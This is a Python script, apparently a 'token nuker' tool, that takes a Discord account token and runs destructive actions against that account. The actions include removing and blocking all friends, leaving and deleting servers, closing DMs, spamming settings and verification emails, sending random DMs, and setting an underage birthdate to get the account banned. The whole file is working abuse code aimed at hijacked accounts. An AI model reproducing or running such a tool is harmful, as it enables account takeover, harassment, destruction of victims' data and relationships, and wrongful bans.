import requests
import json
import string
import random
import pretty_errors
import time
import multiprocessing
import sys
import colorama

from colorama import Style, Fore
from time import sleep
from multiprocessing import current_process

t_or_f = [True, False]

Test_Token = input("Enter A Token: ")


def generate_random_string(Ammount):
    string_returned = "".join(
        random.choice(string.ascii_letters) for i in range(0, Ammount)
    )
    return string_returned


def get_all_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    r = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    for friend in r.json():
        print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
        print(f"{'-'*10}")
    time.sleep(3)


def get_token_information(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    token_info_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me", headers=headers
    ).json()
    for key in token_info_request:
        print(f"{Fore.WHITE}{key}: {Fore.RED}{token_info_request[f'{key}']}")
    time.sleep(3)


def spam_token_servers(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for count, i in enumerate(range(0, 25)):
        payload = {"name": generate_random_string(15)}
        spam_server_request = requests.post(
            "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
        )


def remove_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
        )
        print(f"Removed Friend {i['id']}")


def block_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"Blocked Friend {i['id']}")


def spam_token_settings(Token):
	print('Started Job')
	for i in range(0, 100):
		headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
		condition_status = True
		payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
		condition_status = False
		payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)


def leave_all_servers(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
        print(f"Left Guild: {guild['id']}")


def close_all_dms(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )


def cycle_token_status(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(0, 50):
        json = {"custom_status": {"text": "You Got Nuked By Ditto", "emoji_name": "🍉"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "dittotools.xyz", "emoji_name": "🥵"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "Get Good, Get Ditto", "emoji_name": "😈"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)


def send_mass_dm(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        json = {"content": generate_random_string(20)}
        time.sleep(1)
        r = requests.post(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        print(f"Sent DM To {channel['id']}")


def mark_servers_as_read(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mark_guild_request = requests.get(
        "https://discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for channel in mark_guild_request:
        r = requests.post(
            f"https://discord.com/api/v8/guilds/{channel['id']}/ack", headers=headers
        )
        print(channel["id"])


def remove_token_email(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.get(
        "https://canary.discordapp.com/api/v8/guilds/0/members", headers=headers
    )


def delete_discord_webhook(Webhook):
    requests.delete(Webhook)


def get_token_country(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    token_country_request = requests.get(
        "https://discord.com/api/v8/auth/location-metadata", headers=headers
    ).json()
    print(f"Token Country: {token_country_request['country_code']}")


def resend_verification_email(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.post("https://discord.com/api/v8/auth/verify/resend", headers=headers)


def spam_token_email(Token):
    for i in range(0, 20):
        remove_token_email(Token)
        time.sleep(2)
        resend_verification_email(Token)


def ban_token(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    for i in range(0, 1):
        payload = {"username": "Bruh", "discriminator": 9871}
        requests.patch(
            "https://discordapp.com/api/v6/users/@me",
            headers=headers,
            json={"date_of_birth": "2017-2-11"},
        )


def delete_personal_guilds(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    print("Got Data")
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
        print(i["id"])


options_list = {
    "0": get_all_friends,
    "1": get_token_information,
    "2": spam_token_servers,
    "3": remove_all_token_friends,
    "4": block_all_token_friends,
    "5": spam_token_settings,
    "6": leave_all_servers,
    "7": close_all_dms,
    "8": cycle_token_status,
    "9": send_mass_dm,
    "10": mark_servers_as_read,
    "11": remove_token_email,
    "12": delete_discord_webhook,
    "13": get_token_country,
    "14": resend_verification_email,
    "15": spam_token_email,
    "16": ban_token,
    "17": delete_personal_guilds,
}


def main():
    for count, i in enumerate(options_list):
        separate_options = str(options_list[i]).split("<function ")
        print(
            f"{Fore.WHITE}[{Fore.RED}{count}{Fore.WHITE}]",
            f"{Fore.RED}{str(separate_options[1]).split(' at ')[0].replace('_', ' ').upper()}",
        )
    choose_nuke = input("Please Enter An Option From The List: ")
    if choose_nuke == 5 or choose_nuke == "5":
        jobs = []
        for i in range(0, 6):
            process = multiprocessing.Process(
                target=spam_token_settings, args=(Test_Token,)
            )

            jobs.append(process)

        for j in jobs:
            j.start()

        for j in jobs:
            j.join()

    elif choose_nuke == 2 or choose_nuke == "2":
        jobs = []
        for i in range(0, 4):
            process = multiprocessing.Process(
                target=spam_token_servers, args=(Test_Token,)
            )

            jobs.append(process)

        for j in jobs:
            j.start()

        for j in jobs:
            j.join()

    else:
        options_list[choose_nuke](Test_Token)


if __name__ == "__main__":
    while 1:
        try:
            main()
        except KeyboardInterrupt:
            sys.exit()
